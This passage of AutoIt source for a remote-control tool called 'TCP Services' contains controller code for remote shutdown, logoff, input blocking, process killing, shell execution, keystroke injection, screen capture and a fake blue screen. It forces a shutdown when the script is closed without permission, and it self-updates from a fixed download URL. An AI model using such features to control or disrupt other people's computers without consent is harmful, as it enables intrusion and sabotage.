				GUICtrlSetState($blockprocess, $GUI_DISABLE)
				GUICtrlSetState($shellexecute, $GUI_DISABLE)
				GUICtrlSetState($showscreen, $GUI_DISABLE)
				GUICtrlSetState($sendkeys, $GUI_DISABLE)
				GUICtrlSetState($bsod, $GUI_DISABLE)
				GUICtrlSetState($unbsod, $GUI_DISABLE)
				Sleep(500)
				GUICtrlSetData($list, $number & ".) Disconnected")
				$number = $number + 1
			EndIf
			GUICtrlSetData($list, $number & ".) Shutting down services...")
			$number = $number + 1
			TCPShutdown()
			Sleep(200)
			GUIDelete($maingui)
			$autoupdate = 0
			$continueifnodownload = 1
			updatetcpservices()
		Case $msg = $becomeanadmin
			If $servercreated = 0 Then
				_security()
			Else
				_addtolist("You may not modify your security priveleges if you have created a server. Please close it and try again")
			EndIf
	EndSelect
	If $guisettings = 1 Then
		Select
			Case $msg = $savesettings
				If StringIsDigit(GUICtrlRead($speaktextspeedinput)) Then
					If GUICtrlRead($speaktextspeedinput) > 0 And GUICtrlRead($speaktextspeedinput) <= 100 Then
						$speaktextspeed = GUICtrlRead($speaktextspeedinput) / 10
						IniWrite($settingsininame, "General", "speaktextspeed", $speaktextspeed * 10)
						$speaktext = BitAND(GUICtrlRead($speaktexttick), $GUI_CHECKED)
						If $speaktext = 1 Then
							$speaktext = 1
							IniWrite($settingsininame, "General", "speaktext", "yes")
						Else
							$speaktext = 0
							IniWrite($settingsininame, "General", "speaktext", "no")
						EndIf
						$recvdata = BitAND(GUICtrlRead($recvdatatick), $GUI_CHECKED)
						If $recvdata = 1 Then
							$recvdata = 0
							IniWrite($settingsininame, "Connections", "allowdata", "no")
						Else
							$recvdata = 1
							IniWrite($settingsininame, "Connections", "allowdata", "yes")
						EndIf
						$recvconnect = BitAND(GUICtrlRead($recvconnecttick), $GUI_CHECKED)
						If $recvconnect = 1 Then
							$recvconnect = 0
							IniWrite($settingsininame, "Connections", "allowconnections", "no")
						Else
							$recvconnect = 1
							IniWrite($settingsininame, "Connections", "allowconnections", "yes")
						EndIf
						$autoupdate = BitAND(GUICtrlRead($autoupdatetick), $GUI_CHECKED)
						If $autoupdate = 1 Then
							IniWrite($settingsininame, "Updates", "autoupdate", "yes")
						Else
							$autoupdate = 0
							IniWrite($settingsininame, "Updates", "autoupdate", "no")
						EndIf
						GUIDelete($settingsgui)
						$guisettings = 0
					Else
						MsgBox(0 + 16, $apname & " - Settings", "Voice over speed must be in the range 1-100", "", $settingsgui)
					EndIf
				Else
					MsgBox(0 + 16, $apname & " - Settings", "Voice over speed may only contain numbers", "", $settingsgui)
				EndIf
			Case $msg = $GUI_EVENT_CLOSE
				$are_you_sure_you_want_to_exit = MsgBox(1 + 48 + 256, "Settings", "Please make sure you have saved first")
				If $are_you_sure_you_want_to_exit = 1 Then
					GUIDelete($settingsgui)
					$guisettings = 0
				EndIf
		EndSelect
	EndIf
	If $blockedprocesses[0] > 0 Then
		$hash3 = 0
		Do
			$hash3 = $hash3 + 1
			If Not ProcessExists($blockedprocesses[$hash3]) = 0 Then
				ProcessClose($blockedprocesses[$hash3])
				GUICtrlSetData($list, $number & ".) You are not allowed to run: " & $blockedprocesses[$hash3])
				$number = $number + 1
			EndIf
		Until $hash3 = $blockedprocesses[0]
	EndIf
WEnd

Func scriptexited()
	If $allowed_to_exit = 0 Then
		Shutdown(1)
		MsgBox(0, $apname, "Activating countermeasures... Shutting down...")
	EndIf
	If $speaktext = 1 Then
		_SpeakSelectedText("Bye Bye")
	EndIf
EndFunc   ;==>scriptexited

Func updatetcpservices()
	$downloadsuccess = InetGet("http://www.freersbots.co.uk/uploads/6/1/4/4/6144950/tcp_services_current_version.txt", @ScriptDir & "\tcp_services_current_version.txt")
	If $downloadsuccess = 0 Then
		If $continueifnodownload = 1 Then
			MsgBox(0, $apname, "Error retrieving file from host")
			ShellExecute(@ScriptDir & "\" & $apname & ".exe")
			Exit 0
		Else
			Return
		EndIf
	EndIf
	$needupdate = FileRead(@ScriptDir & "\tcp_services_current_version.txt")
	If $needupdate > $currentversion Then
		FileDelete(@ScriptDir & "\tcp_services_current_version.txt")
		$updateproceedplz = MsgBox(4, $apname, "A new version is available. Update?")
		If $updateproceedplz = 6 Then
			SplashTextOn($apname, "Updating, please wait", 150, 60)
			$downloadsuccess = InetGet("http://www.freersbots.co.uk/uploads/6/1/4/4/6144950/tcp_services.exe", @ScriptDir & "\" & $apname & "-new.exe")
			If $downloadsuccess = 0 Then
				MsgBox(0 + 4096, $apname, "Error retrieving file from host")
				ShellExecute(@ScriptDir & "\" & $apname & ".exe")
				Exit 0
			EndIf
			SplashOff()
		EndIf
	Else
		FileDelete(@ScriptDir & "\tcp_services_current_version.txt")
		If $autoupdate = 0 Then
			MsgBox(0, $apname, "No new version is available")
		EndIf
	EndIf
	If $autoupdate = 0 Then
		ShellExecute(@ScriptDir & "\" & $apname & ".exe")
	Else
		Return
	EndIf
	Exit 0
EndFunc   ;==>updatetcpservices

Func exitscript()
	If $connected = 1 Then
		GUICtrlSetData($list, $number & ".) Disconnecting...")
		$number = $number + 1
		$sent = _esend("-**-dis-connect-**-")
		GUICtrlSetState($connect, $GUI_SHOW)
		GUICtrlSetState($disconnect, $GUI_HIDE)
		GUICtrlSetState($ipinput, $GUI_ENABLE)
		GUICtrlSetState($portinput, $GUI_ENABLE)
		GUICtrlSetState($clientiplabel, $GUI_ENABLE)
		GUICtrlSetState($clientportlabel, $GUI_ENABLE)
		GUICtrlSetState($clientmessage, $GUI_DISABLE)
		GUICtrlSetState($remoteshutdown, $GUI_DISABLE)
		GUICtrlSetState($remotelogoff, $GUI_DISABLE)
		GUICtrlSetState($adminlabel, $GUI_DISABLE)
		GUICtrlSetState($blockclosure, $GUI_DISABLE)
		GUICtrlSetState($unblockclosure, $GUI_DISABLE)
		GUICtrlSetState($blockinput, $GUI_DISABLE)
		GUICtrlSetState($unblockinput, $GUI_DISABLE)
		GUICtrlSetState($blockprocess, $GUI_DISABLE)
		GUICtrlSetState($shellexecute, $GUI_DISABLE)
		GUICtrlSetState($showscreen, $GUI_DISABLE)
		GUICtrlSetState($sendkeys, $GUI_DISABLE)
		GUICtrlSetState($bsod, $GUI_DISABLE)
		GUICtrlSetState($unbsod, $GUI_DISABLE)
		Sleep(500)
		GUICtrlSetData($list, $number & ".) Disconnected")
		$number = $number + 1
	EndIf
	GUICtrlSetData($list, $number & ".) Shutting down services...")
	$number = $number + 1
	TCPShutdown()
	Sleep(200)
	GUICtrlSetData($list, $number & ".) Exiting...")
	Sleep(200)
	Exit 0
EndFunc   ;==>exitscript

Func _security()
	GUISetState(@SW_DISABLE, $maingui)
	$securitywindow = GUICreate($apname & "- security", 400, 360, -1, -1, -1, -1, $maingui)
	GUICtrlCreateLabel("Account type:", 10, 10, 380, 20)
	$accounttypecombo = GUICtrlCreateCombo("Administrator", 10, 30, 380, 20)
	GUICtrlSetData($accounttypecombo, "Moderator", "Administrator")
	GUICtrlCreateLabel("Password:", 10, 60, 380, 20)
	$passwordinput = GUICtrlCreateInput("", 10, 80, 380, 20, $ES_PASSWORD)
	$passwordloginbutton = GUICtrlCreateButton("LOGIN", 10, 110, 380, 40)
	GUICtrlCreateLabel("Old password:", 10, 160, 380, 20)
	$oldpasswordinput = GUICtrlCreateInput("", 10, 180, 380, 20, $ES_PASSWORD)
	GUICtrlCreateLabel("New password:", 10, 205, 380, 20)
	$newpasswordinput = GUICtrlCreateInput("", 10, 225, 380, 20, $ES_PASSWORD)
	GUICtrlCreateLabel("Confirm new password:", 10, 250, 380, 20)
	$newpasswordinput2 = GUICtrlCreateInput("", 10, 270, 380, 20, $ES_PASSWORD)
	$changepasswordbutton = GUICtrlCreateButton("CHANGE", 10, 300, 380, 50)
	GUISetState(@SW_SHOW, $securitywindow)
	$close = 0
	While $close = 0
		$msg2 = GUIGetMsg($securitywindow)
		Select
			Case $msg2 = $GUI_EVENT_CLOSE
				$close = 1
			Case $msg2 = $passwordloginbutton Or $msg2 = $passwordinput
				Switch GUICtrlRead($accounttypecombo)
					Case "Moderator"
						$passcodeentered = GUICtrlRead($passwordinput)
						$encryptedpasscode = IniRead($settingsininame, "Security", "Moderatorpass", "xdhgivdyogvijeo")
						$decryptedpassword = _StringEncrypt(0, $encryptedpasscode, $stringencryptpassword, 2)
						If $passcodeentered = $decryptedpassword Then
							$close = 1
							_addtolist("Logged in as a Moderator", $speaktext)
							$admin = $moderatorpasslevel
							$username = @UserName & " (Mod)"
							GUICtrlSetData($adminlevellab, "Admin level: " & $admin)
							If $connected = 1 Then
								_esend("-**-changeid-**-")
								Sleep(100)
								_esend($username)
								Sleep(100)
								_esend($admin)
								GUICtrlSetState($connect, $GUI_HIDE)
								GUICtrlSetState($disconnect, $GUI_SHOW)
								GUICtrlSetState($ipinput, $GUI_DISABLE)
								GUICtrlSetState($portinput, $GUI_DISABLE)
								GUICtrlSetState($clientiplabel, $GUI_DISABLE)
								GUICtrlSetState($clientportlabel, $GUI_DISABLE)
								GUICtrlSetState($clientmessage, $GUI_ENABLE)
								GUICtrlSetState($remotelogoff, $GUI_ENABLE)
								GUICtrlSetState($remoteshutdown, $GUI_ENABLE)
								GUICtrlSetState($adminlabel, $GUI_ENABLE)
								GUICtrlSetState($blockclosure, $GUI_ENABLE)
								GUICtrlSetState($unblockclosure, $GUI_ENABLE)
								GUICtrlSetState($blockinput, $GUI_ENABLE)
								GUICtrlSetState($unblockinput, $GUI_ENABLE)
								GUICtrlSetState($blockprocess, $GUI_ENABLE)
								GUICtrlSetState($shellexecute, $GUI_ENABLE)
								GUICtrlSetState($showscreen, $GUI_ENABLE)
								GUICtrlSetState($sendkeys, $GUI_ENABLE)
								GUICtrlSetState($remotelogoff, $GUI_DISABLE)
								GUICtrlSetState($remoteshutdown, $GUI_DISABLE)
								GUICtrlSetState($bsod, $GUI_DISABLE)
								GUICtrlSetState($unbsod, $GUI_DISABLE)
							EndIf
						Else
							MsgBox(0 + 16, $apname & "- security", "Incorrect password", "", $securitywindow)
						EndIf
					Case "Administrator"
						$passcodeentered = GUICtrlRead($passwordinput)
						$encryptedpasscode = IniRead($settingsininame, "Security", "Adminpass", "xdhgivdyogvijeo")
						$decryptedpassword = _StringEncrypt(0, $encryptedpasscode, $stringencryptpassword, 2)
						If $passcodeentered = $decryptedpassword Then
							$close = 1
							_addtolist("Logged in as a Administrator", $speaktext)
							$admin = $adminpasslevel
							GUICtrlSetData($adminlevellab, "Admin level: " & $admin)
							$username = @UserName & " (Admin)"
							If $connected = 1 Then
								_esend("-**-changeid-**-")
								Sleep(100)
								_esend($username)
								Sleep(100)
								_esend($admin)
								GUICtrlSetState($connect, $GUI_HIDE)
								GUICtrlSetState($disconnect, $GUI_SHOW)
								GUICtrlSetState($ipinput, $GUI_DISABLE)
								GUICtrlSetState($portinput, $GUI_DISABLE)
								GUICtrlSetState($clientiplabel, $GUI_DISABLE)
								GUICtrlSetState($clientportlabel, $GUI_DISABLE)
								GUICtrlSetState($clientmessage, $GUI_ENABLE)
								GUICtrlSetState($adminlabel, $GUI_ENABLE)
								GUICtrlSetState($blockclosure, $GUI_ENABLE)
								GUICtrlSetState($unblockclosure, $GUI_ENABLE)
								GUICtrlSetState($blockinput, $GUI_ENABLE)
								GUICtrlSetState($unblockinput, $GUI_ENABLE)
								GUICtrlSetState($blockprocess, $GUI_ENABLE)
								GUICtrlSetState($shellexecute, $GUI_ENABLE)
								GUICtrlSetState($showscreen, $GUI_ENABLE)
								GUICtrlSetState($sendkeys, $GUI_ENABLE)
								GUICtrlSetState($remotelogoff, $GUI_ENABLE)
								GUICtrlSetState($remoteshutdown, $GUI_ENABLE)
								GUICtrlSetState($bsod, $GUI_ENABLE)
								GUICtrlSetState($unbsod, $GUI_ENABLE)
							EndIf
						Else
							MsgBox(0 + 16, $apname & "- security", "Incorrect password", "", $securitywindow)
						EndIf
						GUICtrlSetData($oldpasswordinput, "")
						GUICtrlSetData($newpasswordinput, "")
						GUICtrlSetData($newpasswordinput2, "")
						GUICtrlSetData($passwordinput, "")
				EndSwitch
			Case $msg2 = $changepasswordbutton
				Switch GUICtrlRead($accounttypecombo)
					Case "Moderator"
						If GUICtrlRead($oldpasswordinput) = _StringEncrypt(0, IniRead($settingsininame, "Security", "Moderatorpass", "zskejfg"), $stringencryptpassword, 2) Then
							If GUICtrlRead($newpasswordinput) = GUICtrlRead($newpasswordinput2) Then
								IniWrite($settingsininame, "Security", "Moderatorpass", _StringEncrypt(1, GUICtrlRead($newpasswordinput), $stringencryptpassword, 2))
								GUICtrlSetData($list, $number & ".) The Moderator password has been changed")
								$number = $number + 1
							Else
								MsgBox(0 + 16, $apname & "- security", "The new passwords are different", "", $securitywindow)
							EndIf
						Else
							MsgBox(0 + 16, $apname & "- security", "The old password is incorrect", "", $securitywindow)
						EndIf
					Case "Administrator"
						If GUICtrlRead($oldpasswordinput) = _StringEncrypt(0, IniRead($settingsininame, "Security", "Adminpass", "zskejfg"), $stringencryptpassword, 2) Then
							If GUICtrlRead($newpasswordinput) = GUICtrlRead($newpasswordinput2) Then
								IniWrite($settingsininame, "Security", "Adminpass", _StringEncrypt(1, GUICtrlRead($newpasswordinput), $stringencryptpassword, 2))
								GUICtrlSetData($list, $number & ".) The Administrator password has been changed")
								$number = $number + 1
							Else
								MsgBox(0, $apname & "- security", "The new passwords are different", "", $securitywindow)
							EndIf
						Else
							MsgBox(0 + 16, $apname & "- security", "The old password is incorrect", "", $securitywindow)
						EndIf
				EndSwitch
				GUICtrlSetData($oldpasswordinput, "")
				GUICtrlSetData($newpasswordinput, "")
				GUICtrlSetData($newpasswordinput2, "")
				GUICtrlSetData($passwordinput, "")
		EndSelect
	WEnd
	GUISetState(@SW_ENABLE, $maingui)
	GUIDelete($securitywindow)
EndFunc   ;==>_security

Func _information()
	GUISetState(@SW_DISABLE, $maingui)
	$infowindow = GUICreate($apname & "- Info", 300, 120, -1, -1, -1, -1, $maingui)
	GUICtrlCreateLabel("TCP Services V1.3.3.1" & @LF & @LF & "Programmed in Autoit by subzerostig" & @LF & @LF & "Bsod made by Matthieuautoitscripter" & @LF & @LF & "Encryption key generated by mersenne twister" & @LF & "Mersenne twister info will be shown on exit",10,10,280,200)
	GUISetState(@SW_SHOW,$infowindow)
	While 1
		Switch GUIGetMsg()
			Case $GUI_EVENT_CLOSE
				ExitLoop
		EndSwitch
	WEnd
	MsgBox(0+64,$apname & " - Info - Mersenne twister","This script uses the Mersenne Twister random number generator, MT19937, written by Takuji Nishimura, Makoto Matsumoto, Shawn Cokus, Matthe Bellew and Isaku Wada." & @LF & "The Mersenne Twister is an algorithm for generating random numbers. It was designed with consideration of the flaws in various other generators. The period, 219937-1, and the order of equidistribution, 623 dimensions, are far greater. The generator is also fast; it avoids multiplication and division, and it benefits from caches and pipelines. For more information see the inventors' web page at http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/emt.html" & @LF & "Copyright (C) 1997 - 2002, Makoto Matsumoto and Takuji Nishimura, All rights reserved." & @LF & "Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:" & @LF & "1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer." & @LF & "2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution." & @LF & "3. The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission." & @LF & "THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 'AS IS' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.","",$infowindow)
	GUISetState(@SW_ENABLE, $maingui)
	GUIDelete($infowindow)
EndFunc

Func _ChangeScreenRes($i_Width = @DesktopWidth, $i_Height = @DesktopHeight, $i_BitsPP = @DesktopDepth, $i_RefreshRate = @DesktopRefresh) ;from ChangeResolution.au3
	Local Const $DM_PELSWIDTH = 0x00080000
	Local Const $DM_PELSHEIGHT = 0x00100000
	Local Const $DM_BITSPERPEL = 0x00040000
	Local Const $DM_DISPLAYFREQUENCY = 0x00400000
	Local Const $CDS_TEST = 0x00000002
	Local Const $CDS_UPDATEREGISTRY = 0x00000001
	Local Const $DISP_CHANGE_RESTART = 1
	Local Const $DISP_CHANGE_SUCCESSFUL = 0
	Local Const $HWND_BROADCAST = 0xffff
	Local Const $WM_DISPLAYCHANGE = 0x007E
	If $i_Width = "" Or $i_Width = -1 Then $i_Width = @DesktopWidth
	If $i_Height = "" Or $i_Height = -1 Then $i_Height = @DesktopHeight
	If $i_BitsPP = "" Or $i_BitsPP = -1 Then $i_BitsPP = @DesktopDepth
	If $i_RefreshRate = "" Or $i_RefreshRate = -1 Then $i_RefreshRate = @DesktopRefresh
	Local $DEVMODE = DllStructCreate("byte[32];int[10];byte[32];int[6]")
	Local $B = DllCall("user32.dll", "int", "EnumDisplaySettings", "ptr", 0, "long", 0, "ptr", DllStructGetPtr($DEVMODE))
	If @error Then
		$B = 0
		SetError(1)
		Return $B
	Else
		$B = $B[0]
	EndIf
	If $B <> 0 Then
		DllStructSetData($DEVMODE, 2, BitOR($DM_PELSWIDTH, $DM_PELSHEIGHT, $DM_BITSPERPEL, $DM_DISPLAYFREQUENCY), 5)
		DllStructSetData($DEVMODE, 4, $i_Width, 2)
		DllStructSetData($DEVMODE, 4, $i_Height, 3)
		DllStructSetData($DEVMODE, 4, $i_BitsPP, 1)
		DllStructSetData($DEVMODE, 4, $i_RefreshRate, 5)
		$B = DllCall("user32.dll", "int", "ChangeDisplaySettings", "ptr", DllStructGetPtr($DEVMODE), "int", $CDS_TEST)
		If @error Then
			$B = -1
		Else
			$B = $B[0]
		EndIf
		Select
			Case $B = $DISP_CHANGE_RESTART
				$DEVMODE = ""
				Return 2
			Case $B = $DISP_CHANGE_SUCCESSFUL
				DllCall("user32.dll", "int", "ChangeDisplaySettings", "ptr", DllStructGetPtr($DEVMODE), "int", $CDS_UPDATEREGISTRY)
				DllCall("user32.dll", "int", "SendMessage", "hwnd", $HWND_BROADCAST, "int", $WM_DISPLAYCHANGE, _
						"int", $i_BitsPP, "int", $i_Height * 2 ^ 16 + $i_Width)
				$DEVMODE = ""
				Return 1
			Case Else
				$DEVMODE = ""
				SetError(1)
				Return $B
		EndSelect
	EndIf
EndFunc   ;==>_ChangeScreenRes

Func _showscreen()
	$showscreenquality = InputBox($apname & " - show screen quality", "Enter quality (1-100)")
	If $showscreenquality < 1 Or $showscreenquality > 100 Then
		SetError(2)
		Return -1
	EndIf
	Global $timerhandle = TimerInit()
	Global $tempsocket = TCPListen(@IPAddress1, "54321")
	_esend("-**-show-screen-**-")
	Sleep(150)
	_esend(@IPAddress1)
	Sleep(150)
	_esend($showscreenquality)
	Do
		Global $tempaccept = TCPAccept($tempsocket)
	Until $tempaccept <> -1 Or TimerDiff($timerhandle) > 5000
	If TimerDiff($timerhandle) > 5000 Then
		SetError(1)
		Return -1
	EndIf
	If FileExists(@TempDir & "\tcp services show screen.jpg") Then
		FileDelete(@TempDir & "\tcp services show screen.jpg")
	EndIf
	Do
		$temprecv = TCPRecv($tempaccept, 100000000)
	Until $temprecv <> "" Or TimerDiff($timerhandle) > 5000
	If TimerDiff($timerhandle) > 5000 Then
		SetError(1)
		Return -1
	EndIf
	FileWrite(@TempDir & "\tcp services show screen.jpg", $temprecv)
	TCPCloseSocket($tempaccept)
	ShellExecute(@TempDir & "\tcp services show screen.jpg")
EndFunc   ;==>_showscreen

;########################################################################################################################################################################
;self specific UDF's

Func _esend($messagetoencyptsend)
	$tcp_encryptionresult = TCPSend($result, _StringEncrypt(1, $messagetoencyptsend, $encyptionkey, 1))
	Return $tcp_encryptionresult
EndFunc   ;==>_esend

Func _addtolist($atl_datatowritetolist, $atl_speaktext = 0)
	GUICtrlSetData($list, $number & ".) " & $atl_datatowritetolist)
	$number = $number + 1
	If $atl_speaktext = 1 Then
		_SpeakSelectedText($atl_datatowritetolist)
	EndIf
EndFunc   ;==>_addtolist

Func _SpeakSelectedText($sst_text)
	$Voice.Rate = $speaktextspeed
	$Voice.Volume = 100
	$Voice.Speak($sst_text)
EndFunc   ;==>_SpeakSelectedText
